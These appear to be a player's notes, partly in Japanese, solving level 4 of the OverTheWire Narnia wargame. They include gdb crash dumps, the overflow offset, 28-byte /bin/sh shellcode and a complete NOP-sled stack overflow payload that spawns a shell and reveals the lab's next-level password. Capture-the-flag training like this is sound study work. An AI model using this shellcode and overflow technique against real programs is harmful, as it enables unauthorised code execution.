```sh
$ ssh -p 2226 narnia4@narnia.labs.overthewire.org
thaenohtai
```

```
gdb-peda$ x/20wx  0x80497e0
0x80497e0 <environ@@GLIBC_2.0>: 0xffffbfec
```

memset("DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-LQRQc6uH14", 0, 0x3b)


## ./narnia4 A\*300
```
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffc290 ("AAAAAAAAAA")
EDX: 0xffffbe2e ("AAAAAAAAAA")
ESI: 0xf7fab000 --> 0x1b1db0 
EDI: 0xf7fab000 --> 0x1b1db0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffbe20 ('A' <repeats 24 times>)
EIP: 0x41414141 ('AAAA') <- EIP取れてる
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffbe20 ('A' <repeats 24 times>)
0004| 0xffffbe24 ('A' <repeats 20 times>)
0008| 0xffffbe28 ('A' <repeats 16 times>)
0012| 0xffffbe2c ('A' <repeats 12 times>)
0016| 0xffffbe30 ("AAAAAAAA")
0020| 0xffffbe34 ("AAAA")
0024| 0xffffbe38 --> 0xf7fab000 --> 0x1b1db0 
0028| 0xffffbe3c --> 0xf7ffdc04 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x41414141 in ?? ()
```

```
gdb-peda$ b \*0x804852e
Breakpoint 2 at 0x804852e
gdb-peda$ c
Continuing.
```


A272回でSEVG

```
0xffffc190: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc1a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc1b0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc1c0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc1d0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc1e0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc1f0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc200: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc210: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc220: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc230: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc240: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc250: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc260: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc270: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc280: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffc290: 0x41414141  0x41414141  0x00004141
```


EIP: 0xbfc382c3

A272

```sh
$(echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB")
```

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80 28bytes
```


272 - 28 = 244

```sh
$(python -c 'print "\x90" * 244 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xf0\xc1\xff\xff"')
```



## In remote
```
0xffffd7d0: 0x2f61696e  0x6e72616e  0x00346169  0x41414141
0xffffd7e0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd7f0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd800: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd810: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd820: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd830: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd840: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd850: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd860: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd870: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd880: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd890: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8b0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8c0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8d0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8e0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8f0: 0x41414141  0x00000000  0x00000000  0x00000000
```


```sh
narnia4@narnia:/etc/narnia_pass$ /narnia/narnia4 $(python -c 'print "\x90" * 244 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\xd8\xff\xff"')
$ cat narnia5
faimahchiy
$ exit
```

リモートでのアドレスを調べて、そこら辺の範囲に遷移させればスライドしていき、シェルコードが実行される
